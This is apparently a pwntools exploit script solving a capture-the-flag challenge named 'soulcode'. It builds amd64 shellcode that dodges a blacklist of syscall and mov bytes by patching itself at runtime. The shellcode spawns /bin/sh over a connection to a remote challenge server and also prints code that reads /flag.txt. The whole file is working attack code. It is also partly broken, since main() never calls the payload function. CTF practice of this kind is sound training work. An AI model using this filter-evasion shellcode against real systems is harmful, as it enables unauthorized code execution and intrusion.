#!/usr/bin/env python3

from pwn import *

exe = ELF("./soulcode")
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])

        if args.PLT_DEBUG:
            gdb.attach(r)

    else:
        r = remote("challs.dantectf.it/tcp", 31532)

    return r


def spawn_shell():

    # BLACKLISTED: {'\x0f\x05': 'syscall (64-bit)', '\xcd\x80': 'int 0x80 (32-bit)', '\x89': 'mov'}
    payload = b''

    # Modifies \x10\x06 into \x0f\x05 which is "syscall"
    payload += asm('sub word ptr[rsp + 64], 1')
    payload += asm('sub word ptr[rsp + 65], 1')
    
    payload += asm(shellcraft.amd64.push(0x0068732f6e69622f))
    payload += asm('lea rdi, qword ptr[rsp]')

    payload += asm(shellcraft.amd64.push(0))
    payload += asm('pop rsi')

    payload += asm(shellcraft.amd64.push(0))
    payload += asm('pop rdx')

    payload += asm(shellcraft.amd64.push(59))
    payload += asm('pop rax')

    payload += b'\x10\x06\x00\x00\x00\x00\x00\x00'

    print(asm(shellcraft.amd64.linux.cat('/flag.txt', 0)))

    r.sendlineafter('posterity!\n', payload)
    r.interactive()


def main():
    r = conn()
    print(shellcraft.amd64.linux.cat('/flag.txt', 1))


if __name__ == "__main__":
    main()